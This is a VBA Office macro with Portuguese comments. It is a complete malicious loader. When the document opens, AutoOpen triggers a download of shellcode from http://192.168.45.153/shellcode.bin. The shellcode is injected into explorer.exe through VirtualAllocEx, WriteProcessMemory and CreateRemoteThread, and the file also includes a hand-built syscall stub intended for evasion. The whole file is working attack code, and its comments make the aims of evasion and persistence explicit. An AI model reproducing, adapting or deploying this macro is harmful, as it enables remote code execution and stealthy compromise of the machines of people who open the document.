Option Explicit

' --- DECLARAÇÕES DE API (Ajustadas para Estabilidade Total) ---
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" (ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As LongPtr)
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As LongPtr, ByVal lpStartAddress As LongPtr, lpParameter As LongPtr, ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr
Private Declare PtrSafe Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As LongPtr, ByVal hWnd As LongPtr, ByVal Msg As LongPtr, ByVal wParam As LongPtr, ByVal lParam As LongPtr) As LongPtr
Private Declare PtrSafe Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAllocEx Lib "kernel32" (ByVal hProcess As LongPtr, ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal nSize As LongPtr, lpNumberOfBytesWritten As LongPtr) As Long
Private Declare PtrSafe Function CreateRemoteThread Lib "kernel32" (ByVal hProcess As LongPtr, ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As LongPtr, ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr
Private Declare PtrSafe Function GetWindowThreadProcessId Lib "user32" (ByVal hWnd As LongPtr, lpdwProcessId As Long) As Long
Private Declare PtrSafe Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As LongPtr

' --- 1. SYSCALL PARA NtProtectVirtualMemory (0x50) ---
Function Syscall(ByVal SSN As Long, ByVal arg1 As LongPtr, ByVal arg2 As LongPtr, ByVal arg3 As LongPtr, ByVal arg4 As LongPtr) As LongPtr
    Dim stub(11) As Byte: Dim bufAddr As LongPtr
    stub(0) = &H4C: stub(1) = &H8B: stub(2) = &HD1: stub(3) = &HB8
    stub(4) = CByte(SSN And &HFF): stub(5) = CByte((SSN And &HFF00&) \ 256)
    stub(8) = &HF: stub(9) = &H5: stub(10) = &HC3
    bufAddr = VirtualAlloc(0, 12, &H3000, &H40)
    RtlMoveMemory bufAddr, stub(0), 11
    Syscall = CallWindowProc(bufAddr, arg1, arg2, arg3, arg4)
End Function

' --- 2. LOADER PRINCIPAL (Sem Toque em Disco) ---
Sub RunEvasiveLoader()
    Dim http As Object: Dim shellcode() As Byte
    Dim hProcess As LongPtr: Dim remoteAddr As LongPtr
    Dim targetPID As Long: Dim hWnd As LongPtr
    
    On Error Resume Next
    
    ' 1. DOWNLOAD
    Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    http.Open "GET", "http://192.168.45.153/shellcode.bin", False
    http.Send

    If http.Status = 200 Then
        shellcode = http.ResponseBody
        
        ' 2. ENCONTRAR PROCESSO ALVO (Explorer.exe é o mais estável para persistência)
        ' Procuramos a janela da Shell para pegar o PID do Explorer
        hWnd = FindWindow("Progman", "Program Manager")
        GetWindowThreadProcessId hWnd, targetPID
        
        If targetPID <> 0 Then
            ' 3. ABRIR PROCESSO (0x001F0FFF = PROCESS_ALL_ACCESS)
            hProcess = OpenProcess(&H1F0FFF, 0, targetPID)
            
            If hProcess <> 0 Then
                ' 4. ALOCAR MEMÓRIA NO EXPLORER
                remoteAddr = VirtualAllocEx(hProcess, 0, UBound(shellcode) + 1, &H3000, &H40)
                
                ' 5. ESCREVER SHELLCODE NO EXPLORER
                WriteProcessMemory hProcess, remoteAddr, shellcode(0), UBound(shellcode) + 1, 0
                
                ' 6. EXECUTAR NO PROCESSO REMOTO
                CreateRemoteThread hProcess, 0, 0, remoteAddr, 0, 0, 0
            End If
        End If
    End If
End Sub

Sub AutoOpen()
    RunEvasiveLoader
End Sub